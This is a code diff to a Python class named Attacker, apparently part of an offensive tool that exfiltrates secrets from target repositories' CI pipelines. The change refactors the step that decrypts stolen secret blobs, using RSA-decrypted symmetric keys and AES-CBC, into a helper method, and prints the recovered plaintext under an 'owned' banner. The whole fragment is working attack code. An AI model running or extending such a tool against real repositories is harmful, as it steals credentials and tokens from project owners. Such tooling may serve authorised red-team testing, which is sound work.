@@ -97,6 +97,31 @@ class Attacker:
 
         return (private_key, pem.decode())
 
+    @staticmethod
+    def __decrypt_secrets(priv_key, blob: str):
+        """Utility method to decrypt secrets given ciphertext blob and a private key.
+        """
+        encrypted_secrets = base64.b64decode(blob[0][1:-1])
+        salt = encrypted_secrets[8:16]
+        ciphertext = encrypted_secrets[16:]
+
+        encrypted_key = base64.b64decode(blob[1][1:-1])
+        sym_key_b64 = priv_key.decrypt(encrypted_key,
+                                        padding.PKCS1v15()).decode()
+        sym_key = base64.b64decode(sym_key_b64)
+
+        derived_key = hashlib.pbkdf2_hmac('sha256', sym_key, salt, 10000, 48)
+        key = derived_key[0:32]
+        iv = derived_key[32:48]
+
+        cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
+        decryptor = cipher.decryptor()
+
+        cleartext = decryptor.update(ciphertext) + decryptor.finalize()
+        cleartext = cleartext[:-cleartext[-1]]
+
+        return cleartext
+
     def __collect_secret_names(self, target_repo):
         """Method to collect list of secrets prior to exifl.
 
@@ -560,27 +585,8 @@ class Attacker:
                 blob = matcher.findall(res)
 
                 if len(blob) == 2:
-                    encrypted_secrets = base64.b64decode(blob[0][1:-1])
-                    salt = encrypted_secrets[8:16]
-                    ciphertext = encrypted_secrets[16:]
-
-                    encrypted_key = base64.b64decode(blob[1][1:-1])
-                    sym_key_b64 = priv_key.decrypt(encrypted_key,
-                                                   padding.PKCS1v15()).decode()
-                    sym_key = base64.b64decode(sym_key_b64)
-
-                    derived_key = hashlib.pbkdf2_hmac('sha256', sym_key, salt, 10000, 48)
-                    key = derived_key[0:32]
-                    iv = derived_key[32:48]
-
-                    cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
-                    decryptor = cipher.decryptor()
-
+                    cleartext = Attacker.__decrypt_secrets(priv_key, blob)
                     Output.owned("Decrypted and Decoded Secrets:")
-
-                    cleartext = decryptor.update(ciphertext) + decryptor.finalize()
-                    cleartext = cleartext[:-cleartext[-1]]
-
                     print(cleartext.decode('utf-8').strip())
 
                 else:
